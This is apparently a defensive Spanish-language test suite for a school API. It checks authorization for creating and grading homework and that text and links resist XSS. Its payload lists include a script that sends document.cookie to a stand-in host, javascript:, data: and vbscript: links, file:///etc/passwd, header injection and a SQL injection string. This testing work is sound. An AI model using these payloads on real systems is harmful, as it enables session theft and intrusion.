import { randomUUID } from 'node:crypto';
import type { Server } from 'node:http';
import request, { Response } from 'supertest';
import { cedulaFicticia, palabraFicticia } from './datos-ficticios';
import { ANIOS_LECTIVOS, Cuerpo, MATERIAS } from './endpoints-academicos';
import { Entrada, INVALIDOS_POR_TIPO, INYECCIONES_TEXTO } from './entradas-maliciosas';
import { tokensRechazados, tokenValido } from './tokens';
import { esperarRechazo, ObtenerServidor } from './verificar-endpoint';

// Suite de tareas (RF-19, RF-20, T1119-A): autorización y saneamiento de texto contra XSS.
//  1. Solo el docente de la asignación crea tareas y califica entregas; la fecha cae dentro del trimestre.
//  2. El texto (título, descripción, retroalimentación) se rechaza o se guarda LITERAL: nunca se interpreta,
//     ni se devuelve como HTML. Los enlaces solo pueden ser http(s): un "javascript:" sería XSS al hacer clic.
//  3. Las tareas las ve el curso; la nota de cada entrega, solo su estudiante, su representante y el docente.
//
// Escenario armado por la API:
//   curso A (año 1, trimestre TA): M1 con el docente D1 (asignación A1), M2 con D2; estudiantes E1 (con su
//            representante R1) y E2
//   curso B (año 2, trimestre TB): M1 con D3; estudiante F (con su representante RF)
// Se aplica igual a la implementación de referencia y a los endpoints reales.

export interface ActorTareas {
  personaId: string;
  usuarioId: string;
  token: string;
}

export interface MundoTareas {
  asignacionA1: string;
  asignacionA2: string;
  /** Trimestre 1 del año del curso A: fechas válidas para las tareas de A1. */
  trimestreA: { id: string; inicio: string; fin: string };
  /** Trimestre del año del curso B: no sirve para una tarea del curso A. */
  trimestreB: string;
  docenteMateria: ActorTareas;
  docenteOtraMateria: ActorTareas;
  docenteOtroCurso: ActorTareas;
  estudiante1: ActorTareas;
  matricula1: string;
  representante1: ActorTareas;
  estudiante2: ActorTareas;
  matricula2: string;
  estudianteOtroCurso: ActorTareas;
  matriculaOtroCurso: string;
  representanteOtroCurso: ActorTareas;
  /** Tarea de A1 creada por D1 al armar el escenario. */
  tarea: string;
}

const ADMIN = `Bearer ${tokenValido(['ADMIN'])}`;
const SECRETARIA = `Bearer ${tokenValido(['SECRETARIA'])}`;

type Metodo = 'get' | 'post' | 'put';

function enviar(servidor: Server, metodo: Metodo, ruta: string, token: string | undefined, cuerpo?: object, cabeceras: Record<string, string> = {}) {
  let peticion = request(servidor)[metodo](ruta);
  if (token !== undefined) {
    peticion = peticion.set('Authorization', token);
  }
  for (const [nombre, valor] of Object.entries(cabeceras)) {
    peticion = peticion.set(nombre, valor);
  }
  return cuerpo ? peticion.send(cuerpo) : peticion;
}

export async function construirMundoTareas(servidor: Server): Promise<MundoTareas> {
  const crear = async (ruta: string, cuerpo: Cuerpo, token = ADMIN): Promise<Cuerpo> => {
    const respuesta = await enviar(servidor, 'post', ruta, token, cuerpo);
    if (respuesta.status !== 201) {
      throw new Error(`No se pudo preparar ${ruta}: HTTP ${respuesta.status} ${respuesta.text.slice(0, 300)}`);
    }
    return respuesta.body as Cuerpo;
  };
  const persona = async (tipo: 'DOCENTE' | 'ESTUDIANTE' | 'REPRESENTANTE'): Promise<ActorTareas> => {
    const creada = await crear('/personas', { id: randomUUID(), tipo, nombres: palabraFicticia(), apellidos: palabraFicticia(), cedula: cedulaFicticia() });
    const usuarioId = String(creada.usuarioId);
    return { personaId: String(creada.id), usuarioId, token: `Bearer ${tokenValido([tipo], { sub: usuarioId })}` };
  };
  /** Año lectivo nuevo con su curso y su primer trimestre (septiembre a noviembre). */
  const cursoConTrimestre = async (): Promise<{ curso: string; trimestre: { id: string; inicio: string; fin: string } }> => {
    const anio = await crear('/anios-lectivos', await ANIOS_LECTIVOS.cuerpoValido(crear));
    const curso = await crear('/cursos', { id: randomUUID(), anioLectivoId: anio.id, nivel: `Nivel ${palabraFicticia()} EGB`, paralelo: 'A' });
    const inicio = String(anio.inicio);
    const trimestre = { id: randomUUID(), inicio, fin: `${inicio.slice(0, 4)}-11-30` };
    await crear('/periodos', { ...trimestre, anioLectivoId: anio.id, numero: 1 });
    return { curso: String(curso.id), trimestre };
  };
  const asignar = async (docente: ActorTareas, materiaId: string, cursoId: string): Promise<string> =>
    String((await crear('/asignaciones', { docenteId: docente.personaId, materiaId, cursoId })).id);
  const matricular = async (estudiante: ActorTareas, cursoId: string): Promise<string> =>
    String((await crear('/matriculas', { estudianteId: estudiante.personaId, cursoId }, SECRETARIA)).id);
  const representar = async (representante: ActorTareas, estudiante: ActorTareas): Promise<void> => {
    await crear('/representaciones', { estudianteId: estudiante.personaId, representanteId: representante.personaId, parentesco: 'Madre' });
  };

  const a = await cursoConTrimestre();
  const b = await cursoConTrimestre();
  const materia1 = String((await crear('/materias', await MATERIAS.cuerpoValido(crear))).id);
  const materia2 = String((await crear('/materias', await MATERIAS.cuerpoValido(crear))).id);

  const [docenteMateria, docenteOtraMateria, docenteOtroCurso] = [await persona('DOCENTE'), await persona('DOCENTE'), await persona('DOCENTE')];
  const asignacionA1 = await asignar(docenteMateria, materia1, a.curso);
  const asignacionA2 = await asignar(docenteOtraMateria, materia2, a.curso);
  await asignar(docenteOtroCurso, materia1, b.curso);

  const [estudiante1, estudiante2, estudianteOtroCurso] = [await persona('ESTUDIANTE'), await persona('ESTUDIANTE'), await persona('ESTUDIANTE')];
  const [representante1, representanteOtroCurso] = [await persona('REPRESENTANTE'), await persona('REPRESENTANTE')];
  await representar(representante1, estudiante1);
  await representar(representanteOtroCurso, estudianteOtroCurso);
  const matricula1 = await matricular(estudiante1, a.curso);
  const matricula2 = await matricular(estudiante2, a.curso);
  const matriculaOtroCurso = await matricular(estudianteOtroCurso, b.curso);

  // Control: el docente de la asignación crea una tarea
  const tarea = await crear(
    '/tareas',
    { asignacionId: asignacionA1, periodoId: a.trimestre.id, tipo: 'TAREA', titulo: 'Taller 1: fracciones', fechaEntrega: a.trimestre.fin },
    docenteMateria.token,
  );

  return {
    asignacionA1,
    asignacionA2,
    trimestreA: a.trimestre,
    trimestreB: b.trimestre.id,
    docenteMateria,
    docenteOtraMateria,
    docenteOtroCurso,
    estudiante1,
    matricula1,
    representante1,
    estudiante2,
    matricula2,
    estudianteOtroCurso,
    matriculaOtroCurso,
    representanteOtroCurso,
    tarea: String(tarea.id),
  };
}

/** HTML y trucos de XSS además de INYECCIONES_TEXTO (T1109-A): se rechazan o se guardan literales. */
export const CARGAS_XSS: Entrada[] = [
  ...INYECCIONES_TEXTO,
  { nombre: 'SVG con onload', valor: '<svg onload=alert(1)>' },
  { nombre: 'iframe con javascript:', valor: '<iframe src="javascript:alert(1)"></iframe>' },
  { nombre: 'enlace HTML con javascript:', valor: '<a href="javascript:alert(1)">ver guía</a>' },
  { nombre: 'enlace de Markdown con javascript:', valor: '[ver guía](javascript:alert(1))' },
  { nombre: 'etiqueta cerrando el atributo', valor: "'><script>fetch('//x.test?c='+document.cookie)</script>" },
  { nombre: 'entidades HTML', valor: '&lt;script&gt;alert(1)&lt;/script&gt;' },
  { nombre: 'escape \\u003c como texto', valor: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e' },
  { nombre: 'comentario condicional', valor: '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->' },
];

/** Enlaces que nunca deben guardarse: al hacer clic ejecutarían código o abrirían algo que no es una página. */
export const ENLACES_PELIGROSOS: Entrada[] = [
  { nombre: 'javascript:', valor: 'javascript:alert(document.cookie)' },
  { nombre: 'JavaScript con mayúsculas mezcladas', valor: 'JaVaScRiPt:alert(1)' },
  { nombre: 'javascript: con espacio delante', valor: ' javascript:alert(1)' },
  { nombre: 'javascript: partido por un tabulador', valor: 'java\tscript:alert(1)' },
  { nombre: 'data: con HTML', valor: 'data:text/html,<script>alert(1)</script>' },
  { nombre: 'data: en base64', valor: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
  { nombre: 'vbscript:', valor: 'vbscript:msgbox(1)' },
  { nombre: 'file:', valor: 'file:///etc/passwd' },
  { nombre: 'relativo al protocolo', valor: '//malicioso.test/guia' },
  { nombre: 'con usuario engañoso', valor: 'https://colegio.test@malicioso.test/guia' },
  { nombre: 'con salto de línea', valor: 'https://ejemplo.test/\r\nSet-Cookie: x=1' },
  { nombre: 'muy largo', valor: `https://ejemplo.test/${'a'.repeat(300)}` },
  { nombre: 'que no es texto', valor: { href: 'https://ejemplo.test' } },
];

export function verificarTareas(obtener: ObtenerServidor, mundo: () => MundoTareas): void {
  const como = (actor: ActorTareas | string | undefined): string | undefined => (typeof actor === 'object' ? actor.token : actor);
  const crearTarea = (actor: ActorTareas | string | undefined, cuerpo: object): Promise<Response> => enviar(obtener(), 'post', '/tareas', como(actor), cuerpo);
  const listarTareas = (actor: ActorTareas | string, asignacionId: string): Promise<Response> =>
    enviar(obtener(), 'get', `/tareas?asignacionId=${asignacionId}`, como(actor));
  const calificar = (actor: ActorTareas | string | undefined, tareaId: string, cuerpo: object): Promise<Response> =>
    enviar(obtener(), 'put', `/tareas/${tareaId}/entregas`, como(actor), cuerpo);
  const verEntregas = (actor: ActorTareas | string, tareaId: string): Promise<Response> => enviar(obtener(), 'get', `/tareas/${tareaId}/entregas`, como(actor));

  /** Tarea válida de A1, con fecha dentro del trimestre. */
  const tareaValida = (m: MundoTareas, cambios: object = {}): Cuerpo => ({
    id: randomUUID(),
    asignacionId: m.asignacionA1,
    periodoId: m.trimestreA.id,
    tipo: 'PRUEBA',
    titulo: `Prueba ${palabraFicticia()}`,
    descripcion: 'Resolver los ejercicios 1 a 10.\nTraer calculadora.',
    fechaEntrega: m.trimestreA.fin,
    enlaceRecurso: 'https://ejemplo.test/guia.pdf',
    ...cambios,
  });

  /** Aceptado: el texto debe volver idéntico al crearlo y al listarlo, y siempre como JSON. Rechazado: 400 limpio. */
  const rechazadoOLiteral = async (respuesta: Response, campo: string, valor: unknown, releer: () => Promise<Cuerpo | undefined>): Promise<void> => {
    if (respuesta.status !== 201 && respuesta.status !== 200) {
      esperarRechazo(respuesta, [400], valor);
      return;
    }
    expect(respuesta.headers['content-type']).toMatch(/^application\/json/);
    expect(respuesta.body[campo]).toBe(valor);
    expect((await releer())?.[campo]).toBe(valor);
  };

  describe('Crear tareas: solo el docente de la asignación (RF-19)', () => {
    it('el docente de M1 crea una tarea en su asignación (control)', async () => {
      const m = mundo();
      const cuerpo = tareaValida(m);
      const respuesta = await crearTarea(m.docenteMateria, cuerpo);

      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(201);
      expect(respuesta.body).toMatchObject({ id: cuerpo.id, titulo: cuerpo.titulo, descripcion: cuerpo.descripcion, enlaceRecurso: cuerpo.enlaceRecurso });
    });

    const ajenos: [string, (m: MundoTareas) => ActorTareas | string][] = [
      ['el docente de otra materia del mismo curso', (m) => m.docenteOtraMateria],
      ['el docente de la misma materia en otro curso', (m) => m.docenteOtroCurso],
      ['el administrador', () => ADMIN],
      ['la secretaría', () => SECRETARIA],
      ['un estudiante del curso', (m) => m.estudiante1],
      ['un representante del curso', (m) => m.representante1],
      ['un docente sin persona registrada', () => `Bearer ${tokenValido(['DOCENTE'], { sub: randomUUID() })}`],
      ['el docente de M1 si aún no cambia su clave temporal', (m) => `Bearer ${tokenValido(['DOCENTE'], { sub: m.docenteMateria.usuarioId, debe_cambiar_clave: true })}`],
    ];
    for (const [nombre, actor] of ajenos) {
      it(`403 si crea la tarea ${nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await crearTarea(actor(m), tareaValida(m)), [403]);
      });
    }

    for (const token of tokensRechazados()) {
      it(`401 con token ${token.nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await crearTarea(token.cabecera, tareaValida(m)), [401]);
      });
    }

    it('403 idéntico para una asignación ajena y una inventada', async () => {
      const m = mundo();
      const ajena = await crearTarea(m.docenteMateria, tareaValida(m, { asignacionId: m.asignacionA2 }));
      const inventada = await crearTarea(m.docenteMateria, tareaValida(m, { asignacionId: randomUUID() }));

      esperarRechazo(ajena, [403]);
      esperarRechazo(inventada, [403]);
      expect([inventada.body.codigo, inventada.body.mensaje]).toEqual([ajena.body.codigo, ajena.body.mensaje]);
    });

    const fechas: [string, (m: MundoTareas) => object, number[]][] = [
      ['la fecha es posterior al cierre del trimestre (excepción de RF-19)', (m) => ({ fechaEntrega: `${m.trimestreA.fin.slice(0, 4)}-12-15` }), [400]],
      ['la fecha es anterior al inicio del trimestre', (m) => ({ fechaEntrega: `${m.trimestreA.inicio.slice(0, 4)}-08-01` }), [400]],
      ['el trimestre es de otro año lectivo', (m) => ({ periodoId: m.trimestreB }), [400, 404, 422]],
      ['el trimestre no existe', () => ({ periodoId: randomUUID() }), [400, 404, 422]],
    ];
    for (const [nombre, cambios, estados] of fechas) {
      it(`se rechaza si ${nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await crearTarea(m.docenteMateria, tareaValida(m, cambios(m))), estados);
      });
    }

    const invalidos: [string, object][] = [
      ['un tipo que no existe', { tipo: 'EXAMEN_FINAL' }],
      ['bloque 3', { bloque: 3 }],
      ['fecha con hora', { fechaEntrega: '2026-11-20T10:00:00Z' }],
      ['título de un solo carácter', { titulo: 'x' }],
      ['sin título', { titulo: undefined }],
      ['descripción de más de 2000 caracteres', { descripcion: 'a'.repeat(2001) }],
      ['campos que el contrato no define (docenteId)', { docenteId: randomUUID() }],
    ];
    for (const [nombre, cambios] of invalidos) {
      it(`400 con ${nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await crearTarea(m.docenteMateria, tareaValida(m, cambios)), [400]);
      });
    }
  });

  describe('Saneamiento de texto: título y descripción (XSS)', () => {
    const releerTarea = (m: MundoTareas, id: unknown) => async (): Promise<Cuerpo | undefined> =>
      ((await listarTareas(m.docenteMateria, m.asignacionA1)).body as Cuerpo[]).find((t) => t.id === id);

    for (const entrada of CARGAS_XSS) {
      it(`título con ${entrada.nombre}: se rechaza o se guarda literal`, async () => {
        const m = mundo();
        const cuerpo = tareaValida(m, { titulo: entrada.valor });
        await rechazadoOLiteral(await crearTarea(m.docenteMateria, cuerpo), 'titulo', entrada.valor, releerTarea(m, cuerpo.id));
      });
      it(`descripción con ${entrada.nombre}: se rechaza o se guarda literal`, async () => {
        const m = mundo();
        const valor = `Indicaciones:\n${String(entrada.valor)}`;
        const cuerpo = tareaValida(m, { descripcion: valor });
        await rechazadoOLiteral(await crearTarea(m.docenteMateria, cuerpo), 'descripcion', valor, releerTarea(m, cuerpo.id));
      });
    }

    for (const entrada of INVALIDOS_POR_TIPO.texto) {
      it(`400 con un título ${entrada.nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await crearTarea(m.docenteMateria, tareaValida(m, { titulo: entrada.valor })), [400], entrada.valor);
      });
    }

    it('la descripción admite saltos de línea, pero no caracteres que reordenan el texto', async () => {
      const m = mundo();
      esperarRechazo(await crearTarea(m.docenteMateria, tareaValida(m, { descripcion: `Paso 1\n${String.fromCodePoint(0x202e)}oculto` })), [400]);
    });
  });

  describe('Saneamiento de enlaces: solo http(s) (XSS al hacer clic)', () => {
    for (const entrada of ENLACES_PELIGROSOS) {
      it(`400 con un enlace ${entrada.nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await crearTarea(m.docenteMateria, tareaValida(m, { enlaceRecurso: entrada.valor })), [400], entrada.valor);
      });
    }

    it('acepta un enlace https y lo devuelve igual al listar', async () => {
      const m = mundo();
      const cuerpo = tareaValida(m, { enlaceRecurso: 'https://ejemplo.test/recursos/guia%201.pdf?v=2#p3' });
      const respuesta = await crearTarea(m.docenteMateria, cuerpo);

      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(201);
      const listada = ((await listarTareas(m.docenteMateria, m.asignacionA1)).body as Cuerpo[]).find((t) => t.id === cuerpo.id);
      expect(listada?.enlaceRecurso).toBe(cuerpo.enlaceRecurso);
    });

    it('el enlace es opcional', async () => {
      const m = mundo();
      const respuesta = await crearTarea(m.docenteMateria, tareaValida(m, { enlaceRecurso: null }));
      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(201);
    });
  });

  describe('Calificar entregas: solo el docente de la tarea (RF-20)', () => {
    const entrega = (m: MundoTareas, cambios: object = {}): object => ({
      matriculaId: m.matricula1,
      nota: 9.5,
      retroalimentacion: 'Buen trabajo.\nRevisa el ejercicio 4.',
      version: 0,
      ...cambios,
    });

    it('el docente de M1 califica la entrega de su estudiante (control)', async () => {
      const m = mundo();
      const respuesta = await calificar(m.docenteMateria, m.tarea, entrega(m));

      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(200);
      expect(respuesta.body).toMatchObject({ tareaId: m.tarea, matriculaId: m.matricula1, nota: 9.5, retroalimentacion: 'Buen trabajo.\nRevisa el ejercicio 4.' });
    });

    const ajenos: [string, (m: MundoTareas) => ActorTareas | string][] = [
      ['el docente de otra materia del mismo curso', (m) => m.docenteOtraMateria],
      ['el docente de la misma materia en otro curso', (m) => m.docenteOtroCurso],
      ['el administrador', () => ADMIN],
      ['la secretaría', () => SECRETARIA],
      ['el propio estudiante (se pondría su nota)', (m) => m.estudiante1],
      ['su representante', (m) => m.representante1],
    ];
    for (const [nombre, actor] of ajenos) {
      it(`403 si califica ${nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await calificar(actor(m), m.tarea, entrega(m, { matriculaId: m.matricula2 })), [403]);
      });
    }

    it('401 sin token', async () => {
      const m = mundo();
      esperarRechazo(await calificar(undefined, m.tarea, entrega(m)), [401]);
    });

    it('403 idéntico para la tarea de otro docente y una tarea inventada', async () => {
      const m = mundo();
      const ajena = await calificar(m.docenteOtraMateria, m.tarea, entrega(m, { matriculaId: m.matricula2 }));
      const inventada = await calificar(m.docenteOtraMateria, randomUUID(), entrega(m, { matriculaId: m.matricula2 }));

      esperarRechazo(ajena, [403]);
      esperarRechazo(inventada, [403]);
      expect([inventada.body.codigo, inventada.body.mensaje]).toEqual([ajena.body.codigo, ajena.body.mensaje]);
    });

    it('se rechaza calificar a un estudiante de otro curso', async () => {
      const m = mundo();
      esperarRechazo(await calificar(m.docenteMateria, m.tarea, entrega(m, { matriculaId: m.matriculaOtroCurso })), [400, 403, 404, 422]);
    });

    it('un estudiante no entrega ni se califica a nombre de otro con estudianteId en el cuerpo', async () => {
      const m = mundo();
      const respuesta = await calificar(m.estudiante1, m.tarea, { ...entrega(m, { matriculaId: m.matricula2 }), estudianteId: m.estudiante2.personaId, nombreEstudiante: 'Otro' });
      esperarRechazo(respuesta, [400, 403]);
    });

    const notas: [string, unknown][] = [
      ['negativa (excepción de RF-20)', -1],
      ['mayor que 10', 10.5],
      ['como texto', '9'],
      ['nula', null],
    ];
    for (const [nombre, nota] of notas) {
      it(`400 con una nota ${nombre}`, async () => {
        const m = mundo();
        esperarRechazo(await calificar(m.docenteMateria, m.tarea, entrega(m, { matriculaId: m.matricula2, nota })), [400]);
      });
    }

    it('400 si el id de la tarea no es un UUID', async () => {
      const m = mundo();
      esperarRechazo(await calificar(m.docenteMateria, encodeURIComponent("1' OR '1'='1"), entrega(m)), [400, 403, 404]);
    });

    it('409 si se guarda sobre una versión vieja', async () => {
      const m = mundo();
      const vigentes = (await verEntregas(m.docenteMateria, m.tarea)).body as Cuerpo[];
      const version = Number(vigentes.find((e) => e.matriculaId === m.matricula2)?.version ?? 0);

      const primera = await calificar(m.docenteMateria, m.tarea, entrega(m, { matriculaId: m.matricula2, nota: 6, version }));
      expect(primera.status, primera.text.slice(0, 300)).toBe(200);
      esperarRechazo(await calificar(m.docenteMateria, m.tarea, entrega(m, { matriculaId: m.matricula2, nota: 7, version })), [409]);
    });

    for (const entrada of CARGAS_XSS) {
      it(`retroalimentación con ${entrada.nombre}: se rechaza o se guarda literal`, async () => {
        const m = mundo();
        const vigentes = (await verEntregas(m.docenteMateria, m.tarea)).body as Cuerpo[];
        const version = Number(vigentes.find((e) => e.matriculaId === m.matricula1)?.version ?? 0);
        const valor = `Comentario: ${String(entrada.valor)}`;
        const respuesta = await calificar(m.docenteMateria, m.tarea, entrega(m, { retroalimentacion: valor, version }));
        await rechazadoOLiteral(respuesta, 'retroalimentacion', valor, async () =>
          ((await verEntregas(m.docenteMateria, m.tarea)).body as Cuerpo[]).find((e) => e.matriculaId === m.matricula1),
        );
      });
    }
  });

  describe('Lectura: el curso ve sus tareas y cada estudiante solo su nota (RF-19, RF-20, RNF-04)', () => {
    it('el estudiante del curso ve la tarea en su calendario', async () => {
      const m = mundo();
      const respuesta = await listarTareas(m.estudiante1, m.asignacionA1);

      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(200);
      expect((respuesta.body as Cuerpo[]).map((t) => t.id)).toContain(m.tarea);
    });

    it('el representante del estudiante también la ve', async () => {
      const m = mundo();
      const respuesta = await listarTareas(m.representante1, m.asignacionA1);
      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(200);
    });

    const sinAcceso: [string, (m: MundoTareas) => ActorTareas | string][] = [
      ['un estudiante de otro curso', (m) => m.estudianteOtroCurso],
      ['el representante de un estudiante de otro curso', (m) => m.representanteOtroCurso],
      ['el docente de otra materia', (m) => m.docenteOtraMateria],
      ['la secretaría', () => SECRETARIA],
    ];
    for (const [nombre, actor] of sinAcceso) {
      it(`403 si ${nombre} pide las tareas de A1`, async () => {
        const m = mundo();
        esperarRechazo(await listarTareas(actor(m), m.asignacionA1), [403]);
      });
      it(`403 si ${nombre} pide las notas de la tarea`, async () => {
        const m = mundo();
        esperarRechazo(await verEntregas(actor(m), m.tarea), [403]);
      });
    }

    it('el docente ve las notas de todo el curso en su tarea', async () => {
      const m = mundo();
      const respuesta = await verEntregas(m.docenteMateria, m.tarea);

      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(200);
      expect(new Set((respuesta.body as Cuerpo[]).map((e) => e.matriculaId))).toEqual(new Set([m.matricula1, m.matricula2]));
    });

    it('cada estudiante ve solo su nota y su comentario, no los del compañero', async () => {
      const m = mundo();
      const deE1 = await verEntregas(m.estudiante1, m.tarea);
      const deE2 = await verEntregas(m.estudiante2, m.tarea);

      expect(deE1.status, deE1.text.slice(0, 300)).toBe(200);
      expect((deE1.body as Cuerpo[]).map((e) => e.matriculaId)).toEqual([m.matricula1]);
      expect(deE1.text).not.toContain(m.matricula2);
      expect((deE2.body as Cuerpo[]).map((e) => e.matriculaId)).toEqual([m.matricula2]);
    });

    it('el representante ve solo la nota de su representado', async () => {
      const m = mundo();
      const respuesta = await verEntregas(m.representante1, m.tarea);

      expect(respuesta.status, respuesta.text.slice(0, 300)).toBe(200);
      expect((respuesta.body as Cuerpo[]).map((e) => e.matriculaId)).toEqual([m.matricula1]);
    });

    it('403 idéntico para las notas de una tarea inventada', async () => {
      const m = mundo();
      const ajena = await verEntregas(m.estudianteOtroCurso, m.tarea);
      const inventada = await verEntregas(m.estudianteOtroCurso, randomUUID());

      esperarRechazo(ajena, [403]);
      esperarRechazo(inventada, [403]);
      expect([inventada.body.codigo, inventada.body.mensaje]).toEqual([ajena.body.codigo, ajena.body.mensaje]);
    });
  });
}
